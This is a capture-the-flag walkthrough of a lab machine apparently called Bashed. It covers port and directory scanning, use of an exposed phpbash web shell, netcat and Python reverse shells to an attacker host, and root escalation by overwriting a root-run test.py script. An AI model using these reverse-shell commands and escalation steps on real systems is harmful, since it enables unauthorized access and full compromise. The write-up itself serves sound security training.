When visiting the IP address provided by the machine, we see the above text, which implies that we are likely to be dealing with a web shell.

## Recon

First, I ran a basic nmap scan:

```bash
nmap -sC -sV -O -oA nmap/initial 10.10.10.68
```

This was the output we got:

```bash
# Nmap 7.91 scan initiated Mon Jul  5 01:40:13 2021 as: nmap -sC -sV -O -oA nmap/initial 10.10.10.68

```

From this, we see that there is only one open port, port 80

- It is running a [http-server-header: Apache/2.4.18]

Now that we are sure that the website is our only possible attack vector, we can now run gobuster on the website

```bash
gobuster dir -t 10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.68                                                   127 ⨯

```

Trying out the viable directories, we see the following php scripts in /dev

![Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%201.png](Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%201.png)

## Feeling our way around

Clicking into phpbash.php, we get the following shell:

![Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%202.png](Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%202.png)

These are the three commands that can help get us clues as to what the shell we obtain can do:

- *whoami*: print effective userid
- *id*: print real and effective user and group IDs
- *uname -a*: print system information

This lets us know that we are running in the context of an Apache default user www-data

## Reverse Shell

In the attack machine (kali) set up a listener:

```bash
nc -nlvp 4444
```

In the target machine (bashed) send a reverse shell to the attack machine

```bash
nc -nv 10.10.14.30 4444 -e /bin/sh
```

However, the connection does not seem like it can be maintained

![Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%203.png](Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%203.png)

Therefore, we can try to obtain a reverse shell in other ways

To verify if we have python on the web shell, we can run the following command:

![Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%204.png](Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%204.png)

This response indicates that we do indeed have python on this box

Hence, we can obtain a reverse shell using the Python code below:

```python
**python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.3",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'**
```

And upon executing the code on phpbash.php, we see the following:

![Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%205.png](Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%205.png)

Bingo we have obtained our reverse shell.

## Enumeration

Enumerating through home, we see that there are two users:

![Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%206.png](Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%206.png)

When we enter arrexel's directory, we can see user.txt, whose contents contain the user flag:

![Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%207.png](Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%207.png)

## More Enumeration

Moving on from the directory, we can head to "/", where we can see many directories

![Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%208.png](Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%208.png)

There is an interesting directory, scripts, which is the only directory not owned by root.

If we now look at "sudo -l", we can see the commands that we can execute as root as the current user we are.

Bingo! We see that we can change our role to scriptmanager with no password.

![Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%209.png](Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%209.png)

Therefore, we can now change our role into scriptmanager as follows:

![Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%2010.png](Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%2010.png)

Now, we can head into "/scripts":

![Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%2011.png](Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%2011.png)

In scripts, we can see that theres test.txt (owned by root) and [test.py](http://test.py) (owned by scriptmanager)

If we look at the contents of test.py, we see the following:

![Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%2012.png](Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%2012.png)

If we look at the timestamps on test.txt, we can see that the text file is updated in short intervals

![Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%2013.png](Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%2013.png)

This likely implies that [test.py](http://test.py) is being executed consistently, which we can likely make use of.

If we change [test.py](http://test.py) to create a reverse shell in test.txt, we might be able to get root access as test.txt has root privileges.

As such, we can simply create a [test.py](http://test.py) on our local machine as follows (replacing the ip address and the sockets with your own):

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((“10.10.14.3”,5555))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);
```

After creating it, we also have to ensure that anyone can execute it:

![Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%2014.png](Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%2014.png)

After that, we can set up a simple HTTP server, and wget our crafted [test.py](http://test.py) to our reverse shell:

![Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%2015.png](Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%2015.png)

![Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%2016.png](Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%2016.png)

Seeing that the file is copied as test.py.1, we have to copy our crafted script to test.py:

![Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%2017.png](Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%2017.png)

Furthermore, we have to ensure that root has the ability to run our copied script, so we do a chmod on it:

![Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%2018.png](Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%2018.png)

With that, we set up a listener on our local machine for the port we wrote in our crafted script (in this case, its 5555):

![Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%2019.png](Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%2019.png)

And if we wait for a minute, we will get a connection for our reverse shell:

![Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%2020.png](Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%2020.png)

And now lastly, all we need to do is head to the root directory where we can now get the root flag:

![Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%2021.png](Bashed%2018d82a629e29436084e14bfc756d8bb3/Untitled%2021.png)
